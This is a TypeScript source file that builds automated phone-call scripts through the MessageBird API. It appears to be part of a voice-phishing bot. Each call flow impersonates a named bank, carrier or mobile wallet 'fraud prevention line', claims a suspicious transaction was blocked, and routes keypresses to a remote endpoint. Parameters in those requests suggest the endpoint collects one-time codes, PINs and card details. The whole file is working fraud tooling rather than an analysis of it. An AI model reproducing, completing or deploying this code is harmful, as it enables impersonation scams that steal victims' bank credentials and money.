import { CallFlowParameter } from 'messagebird/types';
import { languages } from 'messagebird/types/voice_messages';
import { v4 as uuidv4 } from 'uuid';

export const answer = ({
  institutionName,
  language,
  step,
  chatId,
  wallet,
  cardType,
  askCardInfo,
  transferNumber,
  from,
  pinType,
  customMessage,
  actions,
  otpLength,
}: {
  institutionName: string;
  language: languages | undefined;
  step: string;
  chatId: number;
  wallet?: string;
  cardType?: string;
  askCardInfo?: string;
  transferNumber?: string;
  from?: string;
  pinType?: string;
  customMessage?: string;
  actions?: string;
  otpLength?: number;
}): CallFlowParameter => {
  switch (step) {
    case 'bank':
      return {
        id: uuidv4(),
        title: `call bank - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              //@ts-expect-error this is actually a int and not a string
              repeat: 3,
              ifMachine: 'delay',
              payload: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS transaction on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'bankStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'bankStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'bankStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
            },
          },
        ],
      };
    case 'account':
      return {
        id: uuidv4(),
        title: `call account - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              //@ts-expect-error this is actually a int and not a string
              repeat: 3,
              ifMachine: 'delay',
              payload: `This is a call from ${institutionName.toUpperCase()} account security line. We have BLOCKED a recent SUSPICIOUS login attempt on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'accountStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'accountStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'accountStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}&otpLength=${otpLength}`,
            },
          },
        ],
      };
    case 'pay':
      return {
        id: uuidv4(),
        title: `call pay - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              //@ts-expect-error this is actually a int and not a string
              repeat: 3,
              ifMachine: 'delay',
              payload: `This is a call from ${institutionName.toUpperCase()} mobile wallet line. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'payStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'payStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'payStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${
                process.env.ENDPOINT_URL
              }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
                ?.replace(/\s/g, '')
                .toLowerCase()}&otpLength=${otpLength}`,
            },
          },
        ],
      };
    case 'card':
      return {
        id: uuidv4(),
        title: `call card - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              //@ts-expect-error this is actually a int and not a string
              repeat: 3,
              ifMachine: 'delay',
              payload: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'cardStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
            },
          },
        ],
      };
    case 'pgp':
      return {
        id: uuidv4(),
        title: `Calling - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              //@ts-expect-error this is actually a int and not a string
              repeat: 3,
              ifMachine: 'delay',
              payload: `Welcome to the ${institutionName} fraud prevention line. We recently notice a SUSPICIOUS activity on your account. If this was you, simply HANG UP. If this was not you, PLEASE press ONE to speak to a ${institutionName} representative; to better assist you in SECURING your ACCOUNT.`,
              language: 'en-us',
              voice: 'female',
              length: 5,
              loop: true,
            },
            onKeypressGoto: 'nextStep',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error ts does not recognise id
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStep',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error ts does not recognise id
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `We are sorry we missed you, there is a urgent matter in regards to a recent activities on your ${institutionName}  your account. Please Call us back to speak with a bank specialist regarding this matter on ${transferNumber
                ?.split('')
                .join(' ')}`,
              language: 'en-us',
              voice: 'female',
              length: 5,
            },
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error ts does not recognise id
            id: 'nextStep',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?transferNumber=${transferNumber}&from=${from}`,
            },
          },
        ],
      };
    case 'pin':
      return {
        id: uuidv4(),
        title: `call card - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              //@ts-expect-error this is actually a int and not a string
              repeat: 3,
              ifMachine: 'delay',
              payload:
                pinType === 'carrierPin'
                  ? `This is a call from ${institutionName.toUpperCase()} verification center. There as been a suspicious activity on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`
                  : `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We recently noticed a SUSPICIOUS activity on your CARD. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'pinStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'pinStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'pinStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?pinType=${pinType}`,
            },
          },
        ],
      };
    case 'custom':
      return {
        id: uuidv4(),
        title: `Calling - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              //@ts-expect-error this is actually a int and not a string
              repeat: 3,
              payload: `${customMessage}. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language: 'en-us',
              voice: 'female',
              length: 5,
              loop: true,
            },
            onKeypressGoto: 'customNextStep',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'customNextStep',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?actions=${actions}&customMessage=${customMessage}`,
            },
          },
        ],
      };
    default:
      return {
        // @ts-expect-error id is indeed known param
        id: uuidv4(),
        title: 'should never be here',
        steps: [
          {
            action: 'hangup',
          },
        ],
      };
  }
};
